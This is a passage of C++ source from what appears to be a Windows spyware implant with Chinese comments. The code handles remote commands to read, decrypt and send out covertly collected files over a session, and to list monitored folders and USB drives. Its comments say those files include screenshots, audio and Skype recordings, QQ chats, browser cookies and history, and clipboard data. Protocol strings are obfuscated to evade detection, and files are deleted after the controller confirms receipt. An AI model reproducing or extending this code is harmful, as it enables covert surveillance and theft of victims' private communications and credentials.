	if(Op != 2)
	{
		datalen =  sprintf(buffer+datalen, "%s: %s\r\n", DeFileStringA(tmpstr, 30, "HEGkFSWk"), Utf8Path); //filename
		datalen += sprintf(buffer+datalen, "%s %04d%02d%02d%02d%02d%02d\r\n", DeFileStringA(tmpstr, 30, "VEWk:"), //time:
			nowtime.wYear, nowtime.wMonth, nowtime.wDay, 
			nowtime.wHour, nowtime.wMinute, nowtime.wSecond);
		datalen += sprintf(buffer+datalen, "%s%d\r\n", DeFileStringA(tmpstr, 30, "KlFVkFVdGkFgVM: "), lsize); //content-length: 
		datalen += sprintf(buffer+datalen, "%s: %s\r\n", DeFileStringA(tmpstr, 30, "WlFEVlTVupk"), monitortype); //monitortype
		datalen += sprintf(buffer+datalen, "%s\r\n\r\n", DeFileStringA(tmpstr, 30, "KlFVkFVdVupk: HEGk")); //content-type: file
	}
	// 发送文件数据

	BOOL bSend = FALSE;
	if(SendData(buffer, datalen, ptype, session))
	{
		IF_LOUD(DbgFat32Log("SendFile %s, 成功", filename);)
		bSend = TRUE;
	}
	else
	{
		IF_LOUD(DbgFat32Log("SendFile %s, 失败", filename);)
	}

	if (buffer && buffer != tmpbuf)
		delete[] buffer;

	return bSend;
}

BOOL ReadFileData(WCHAR *UnicodeFilePath, char* buffer, DWORD &buflen, __int64 fileoffset)
{
	HANDLE hFile = PCreateFileW(UnicodeFilePath, 
		GENERIC_READ, 
		FILE_SHARE_READ, 
		NULL,
		OPEN_EXISTING, 
		0,
		NULL);
	int Op=-1;
	if(hFile == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}

	LARGE_INTEGER lltotallen;
	PGetFileSizeEx(hFile, &lltotallen);
	__int64 totallen = lltotallen.QuadPart;
	if(totallen<=0 || fileoffset>=totallen )
	{
		CloseHandle(hFile);
		return FALSE;
	}

	LARGE_INTEGER llfileoffset;
	llfileoffset.QuadPart = fileoffset;
	PSetFilePointerEx(hFile, llfileoffset, 0, FILE_BEGIN);
	DWORD outRead;
	PReadFile(hFile, buffer, buflen, &outRead, NULL);
// 	if(strstr(filename, "~\x80") != NULL)
// 		Decode2(buffer, buflen);
	buflen=outRead;
	CloseHandle(hFile);

	return TRUE;
}

DWORD WINAPI  ReGetFileThread(LPVOID lp)
{
	ThreadParam *ppara=(ThreadParam*)lp;
	char buffer[2000], tmpstr[30];
	memset(buffer,0,2000);
	DWORD datalen=0;
	char* filename=NULL;
	__int64 fileoffset=-1;
	char *inputline	=ppara->buf;
	char *nextline	=0;
	char *field		=0;
	char *value		=0;
	//初始化
	int re=0;
	re=LineParser(inputline,&nextline,&field,&value);
	while(re)
	{
		if(stricmp(field, DeFileStringA(tmpstr, 30, "HEGkFSWk"))==0) //filename
		{
			filename=value;
		}
		else if(stricmp(field, DeFileStringA(tmpstr, 30, "HEGklHHCkV"))==0) //fileoffset
		{
			fileoffset=_atoi64(value);
		}	
		inputline=nextline;
		re=LineParser(inputline,&nextline,&field,&value);
	}	
	
	if(filename==NULL || fileoffset==-1)
	{
		//GetFileThread 收到交互命令filename=%s,fileoffset=%I64d error!!!!",filename,fileoffset
		delete ppara;
		return 0;
	}
	//GetFileThread 收到交互命令filename=%s,fileoffset=%I64d",filename,fileoffset

	strlwr(filename);


	WCHAR UnicodePath[MAX_PATH];
	UTF_82Unicode(filename, UnicodePath, MAX_PATH);

	BOOL bCrypt=FALSE;
	WCHAR trodir[MAX_PATH], wTmpStr[10];
	PGetTempPathW(MAX_PATH, trodir);
	wcslwr(trodir);
	if(wcsstr(UnicodePath, trodir) && wcsstr(UnicodePath, DeFileStringW(wTmpStr, 10, L"\\~a4j8"))) //\\~b4d8	/*截屏*/
		bCrypt = TRUE;

	if(wcsstr(UnicodePath, trodir) && wcsstr(UnicodePath, DeFileStringW(wTmpStr, 10, L"\\~a5aj"))) //\\~b5bd	/*录音*/
		bCrypt = TRUE;

	if(wcsstr(UnicodePath, trodir) && wcsstr(UnicodePath, DeFileStringW(wTmpStr, 10, L"\\~a61Z"))) //\\~b61f	/*鼠标记录*/
		bCrypt = TRUE;

	if(wcsstr(UnicodePath, trodir) && wcsstr(UnicodePath, DeFileStringW(wTmpStr, 10, L"\\~a5ai"))) //\\~b5be	/*Skype录音*/
		bCrypt = TRUE;

	if(wcsstr(UnicodePath, trodir) && wcsstr(UnicodePath, DeFileStringW(wTmpStr, 10, L"\\~ki14"))) //\\~ce14	/*QQ聊天*/
		bCrypt = TRUE;

	if(wcsstr(UnicodePath, trodir) && wcsstr(UnicodePath, DeFileStringW(wTmpStr, 10, L"\\~a61h"))) //\\~b61a	/*skype录像*/
		bCrypt = TRUE;
	
	if(wcsstr(UnicodePath, trodir) && wcsstr(UnicodePath, DeFileStringW(wTmpStr, 10, L"\\~aZ24"))) //\\~bf24	/*浏览器历史记录*/
		bCrypt = TRUE;
	
	if(wcsstr(UnicodePath, trodir) && wcsstr(UnicodePath, DeFileStringW(wTmpStr, 10, L"\\~aZ34"))) //\\~bf34	/*浏览器cookie*/
		bCrypt = TRUE;

	if(wcsstr(UnicodePath, trodir) && wcsstr(UnicodePath, DeFileStringW(wTmpStr, 10, L"\\~aa43"))) //\\~bb43	/*md5数据*/
		bCrypt = TRUE;

	if(wcsstr(UnicodePath, trodir) && wcsstr(UnicodePath, DeFileStringW(wTmpStr, 10, L"\\~ZZZZ"))) //\\~ffff	/*其他数据*/
		bCrypt = TRUE;

	if(wcsstr(UnicodePath, trodir) && wcsstr(UnicodePath, DeFileStringW(wTmpStr, 10, L"\\~a4j9"))) //\\~b4d9	/*截屏备用*/
		bCrypt = TRUE;

	if(wcsstr(UnicodePath, trodir) && wcsstr(UnicodePath, DeFileStringW(wTmpStr, 10, L"\\~ki2i"))) //\\~ce2e	/*剪切板*/
		bCrypt = TRUE;

	BOOL flag=FALSE;
	char tempbuf[2000];
	DWORD templen=800;
	//filename
	char strFilename[15];
	memset(strFilename, 0, 15);
	DeFileStringA(strFilename, 15, "HEGkFSWk");
	//fileoffset
	char strFileoffset[15];
	memset(strFileoffset, 0, 15);
	DeFileStringA(strFileoffset, 15, "HEGklHHCkV");

    if(ReadFileData(UnicodePath,tempbuf,templen,fileoffset))
	{
		if(bCrypt)
		{
			Decode2(tempbuf, templen);
		}

		flag=TRUE;
		//filename fileoffset
		datalen=sprintf(buffer, "%s: %s\r\n%s: %I64d\r\n\r\n", 
			strFilename, filename, strFileoffset, fileoffset);
		memcpy(buffer+datalen,tempbuf,templen);
		datalen +=templen;
	}

	if(!flag)//没有找到相应包
	{
		__int64 tmpint = -1;
		datalen=sprintf(buffer, "%s: %s\r\n%s: %I64d\r\n\r\n", 
			strFilename, filename, strFileoffset, tmpint);
	}
	if(SendData(buffer,datalen,ppara->PacketType,ppara->SessionID))
	{
		//GetFileThread重发成功
	}
	
	delete ppara;
	
	return 0;
}

DWORD StartReGetFile(DWORD* ppara)
{
	HANDLE starthandle=0;
	DWORD  threadId=0;
	ThreadParam *tmp=(ThreadParam*)ppara;
	ThreadParam *p = new ThreadParam;
	int len=sizeof(ThreadParam);
 
	memcpy(p->buf, tmp->buf ,tmp->datalen);
	p->datalen=tmp->datalen;
	p->PacketType=tmp->PacketType;
	p->SessionID=tmp->SessionID;
	starthandle = CreateThread(NULL, 0, ReGetFileThread, p, 0, &threadId);
	if (starthandle != NULL)
		CloseHandle(starthandle);
	return 0;
}

DWORD StartQueryFile(DWORD* lp)
{
	ThreadParam *tmp = (ThreadParam*)lp;
	ThreadParam *ppara = new ThreadParam;
 
	memcpy(ppara->buf, tmp->buf ,tmp->datalen);
	ppara->datalen = tmp->datalen;
	ppara->PacketType = tmp->PacketType;
	ppara->SessionID = tmp->SessionID;

	char buffer[2000], tmpstr[20];
	memset(buffer,0,2000);
	DWORD datalen=0;
	char* filename=NULL;
	char *inputline	=ppara->buf;
	char *nextline	=0;
	char *field		=0;
	char *value		=0;
	//初始化
	int re=0;
	re=LineParser(inputline,&nextline,&field,&value);
	while(re)
	{
		if(stricmp(field, DeFileStringA(tmpstr, 20, "HEGkFSWk"))==0) //filename
		{
			filename=value;
		}
		inputline=nextline;
		re=LineParser(inputline,&nextline,&field,&value);
	}

	if(filename==NULL)
	{
		delete ppara;
		return 0;
	}
	
	unsigned __int64 filesize=-1;
	WCHAR UnicodePath[2000];
	UTF_82Unicode(filename, UnicodePath, 2000);

	if(_waccess(UnicodePath, 0)==0)
	{
		struct _stati64 st;
		int	result = _wstati64(UnicodePath, &st );
		if(result==0)
		{
			filesize=st.st_size;
		}
	}
	
	datalen = sprintf(buffer, "%s: %I64d\r\n\r\n", DeFileStringA(tmpstr, 20, "HEGkCEjk"), filesize); //filesize
	
	if(SendData(buffer, datalen, ppara->PacketType, ppara->SessionID))
	{
		//QueryFile成功
	}

	delete ppara;
	
	return 0;
}


DWORD WINAPI  GetMonitorListThread(LPVOID lp)
{
	ThreadParam *ppara=(ThreadParam*)lp;

	char tmpstr[30];
	char* monitortype=NULL;
	char* monitorvalue=NULL;
	char *inputline	=ppara->buf;
	char *nextline	=0;
	char *field		=0;
	char *value		=0;

	//初始化
	int re=0;
	re=LineParser(inputline,&nextline,&field,&value);
	while(re)
	{
		if(stricmp(field, DeFileStringA(tmpstr, 30, "WlFEVlTVupk"))==0) //monitortype
		{
			 monitortype=value;
		}
		else if(stricmp(field, DeFileStringA(tmpstr, 30, "WlFEVlTISGek"))==0) //monitorvalue
		{
			monitorvalue=value;
		}
		inputline=nextline;
		re=LineParser(inputline,&nextline,&field,&value);
	}	
	if(monitortype==NULL || monitorvalue==NULL)
	{
		delete ppara;
		return 1;
	}

	char tlist[10], tusb[10], tnew[15];
	DeFileStringA(tlist, 10, "vETGECV"); //dirlist
	DeFileStringA(tusb, 10, "eCYvET"); //usbdir
	DeFileStringA(tnew, 20, "FkavETGECV"); //newdirlist

	//GetMonitorListThread 收到交互命令monitortype=%s,monitorvalue=%s", monitortype,monitorvalue
	if(stricmp(monitortype, tlist)==0 
		|| stricmp(monitortype, tusb)==0) //目录结构列表,
	{
		if(monitorvalue!=NULL)
		{
			char dirverfiledir[MAX_PATH];
			if (stricmp(monitortype, tlist)==0)
			{
				GetFixDirFolder(dirverfiledir);
			}
			else
			{
				GetUsbDirFolder(dirverfiledir);
			}
			
			char filename[MAX_PATH];
			memset(filename,0,MAX_PATH);
			sprintf(filename,"%s\\%s",dirverfiledir,monitorvalue);

			WCHAR unicodefilename[MAX_PATH];
			memset(unicodefilename, 0, sizeof(unicodefilename));
			UTF_82Unicode(filename, unicodefilename, MAX_PATH*sizeof(WCHAR));

			//
			SendFileFileOpt(unicodefilename, 5, ppara->SessionID, tnew, tnew, 0, 0);
		}
	}
	else  //监控文件列表  usbfile qqmsg等
	{
		char filename[MAX_PATH];
		memset(filename,0,MAX_PATH);

		GetMonitorListFile(monitorvalue,filename);
		DWORD pbuffer=NULL;
		DWORD datalen=0;
		int		Op = -1;

		Op = ReadFileOptFile(filename, pbuffer, datalen, monitortype, monitorvalue);
		char* buffer=(char*)pbuffer;
		if(SendData(buffer,datalen,ppara->PacketType,ppara->SessionID))
		{
			//发送监控目录列表成功
		}
		if(buffer)
			delete[] buffer;
	}

	delete ppara;
	
	return 0;
}


int ReadFileOptFile(char * filename, DWORD& pbuffer, DWORD& datalen, char* monitortype, char* monitorvalue)
{
	char utf8path[3*MAX_PATH], tmpstr[30];
	memset(utf8path, 0, sizeof(utf8path));
	Gb2Utf8(filename, strlen(filename), utf8path, 3*MAX_PATH-1);

	char * buffer=NULL;
	int		Op = -1;
	DWORD	lsize = -1;
	if(access(filename, 0) == 0)
	{
		HANDLE		hFile;
		//读取文本内容
		hFile = PCreateFileA(filename, 
			GENERIC_READ, 
			FILE_SHARE_READ, 
			NULL,
			OPEN_EXISTING, 
			0,
			NULL);
	
		if (hFile!=NULL && hFile!=INVALID_HANDLE_VALUE)
		{
			DWORD hsize=0;
			lsize = PGetFileSize(hFile, &hsize);
			if (hsize>0)
				lsize |= 0x80000000;
			
			if(lsize == 0)
				Op = 0;
			else if(lsize > MAXFILELENGTH)
				Op = 1;
			else
			{
				Op = 2;
				
				buffer = new char[lsize+1024];
	
				if(PReadFile(hFile, buffer, lsize, &lsize, NULL))
				{
				}
				datalen += lsize;
			}
			CloseHandle(hFile);
		}
	}

	if(Op != 2)
	{
		SYSTEMTIME nowtime;
		PGetLocalTime(&nowtime);
		buffer=new char[1024];
		datalen=0;
		datalen =  sprintf(buffer+datalen, "%s: %s\r\n", DeFileStringA(tmpstr, 30, "HEGkFSWk"), utf8path); //filename
		datalen += sprintf(buffer+datalen, "%s %04d%02d%02d%02d%02d%02d\r\n", DeFileStringA(tmpstr, 30, "VEWk:"), //time:
			nowtime.wYear, nowtime.wMonth, nowtime.wDay, 
			nowtime.wHour, nowtime.wMinute, nowtime.wSecond);
		datalen += sprintf(buffer+datalen, "%s%s\r\n", DeFileStringA(tmpstr, 30, "WlFEVlTVupk: "), monitortype); //monitortype: 
		datalen += sprintf(buffer+datalen, "%s: %s\r\n", DeFileStringA(tmpstr, 30, "WlFEVlTISGek"), monitorvalue); //monitorvalue
		datalen += sprintf(buffer+datalen, "%s %d\r\n", DeFileStringA(tmpstr, 30, "KlFVkFVdGkFgVM:"), 0); //content-length:
		datalen += sprintf(buffer+datalen, "%s\r\n\r\n", DeFileStringA(tmpstr, 30, "KlFVkFVdVupk: HEGk")); //content-type: file
	}

	pbuffer=(DWORD)buffer;
	return Op;
}


DWORD StartGetMonitorList(DWORD* ppara)
{
	HANDLE starthandle=0;
	DWORD  threadId=0;
	ThreadParam *tmp=(ThreadParam*)ppara;
	ThreadParam *p = new ThreadParam;
	int len=sizeof(ThreadParam);
     memcpy(p, tmp, sizeof(ThreadParam));

	starthandle = CreateThread(NULL, 0, GetMonitorListThread, p, 0, &threadId);
	if (starthandle != NULL)
		CloseHandle(starthandle);
	return 0;
}

// 确认文件收到
DWORD AckDeleteFile(DWORD* pPara)
{
	ThreadParam *ppara=(ThreadParam*)pPara;
	char *p=0;//目录名
	
	char *field=0;
	char *value=0;
	char *nextline=0;
	char *inputline=ppara->buf;
	
	char  remoteip[MAX_PATH], tmpstr[10];
	memset(remoteip,0,MAX_PATH);
	BOOL  bDelete = FALSE;//remark[MAX_PATH];
	
	int re=0;
	re=LineParser(inputline,&nextline,&field,&value);
	while(re){
		if(stricmp(field, DeFileStringA(tmpstr, 10, "HEGkFSWk"))==0) //filename
		{
			strcpy(remoteip,value);
		}
		else if(stricmp(field, DeFileStringA(tmpstr, 10, "vkGkVk"))==0) //delete
		{
			if(stricmp(value, DeFileStringA(tmpstr, 10, "ukC")) == 0) //yes
				bDelete = TRUE;
		}
		if(re==2)
			break;
		
		inputline=nextline;
		re=LineParser(inputline,&nextline,&field,&value);
	}
	
	//收到文件确认操作, 文件:%s, 删除否:%d", remoteip, bDelete
	WCHAR FilePath[MAX_PATH];
	if(UTF_82Unicode(remoteip, FilePath, MAX_PATH*sizeof(WCHAR)))
	{
		if(bDelete && _waccess(FilePath, 0) == 0)
			PDeleteFileW(FilePath);
		else if (!bDelete && _waccess(FilePath, 0) == 0)
		{
			wcscat(FilePath, L".ok");
			HANDLE m_hFile = PCreateFileW(FilePath, 
				GENERIC_WRITE, 
				0, 
				NULL,
				CREATE_ALWAYS, 
				FILE_ATTRIBUTE_NORMAL        // normal file 
				,NULL);
			if (m_hFile)
			{
				CloseHandle(m_hFile);
			}
		}
	}
	
	// 如果有, 做其它确认操作
	return 1;
}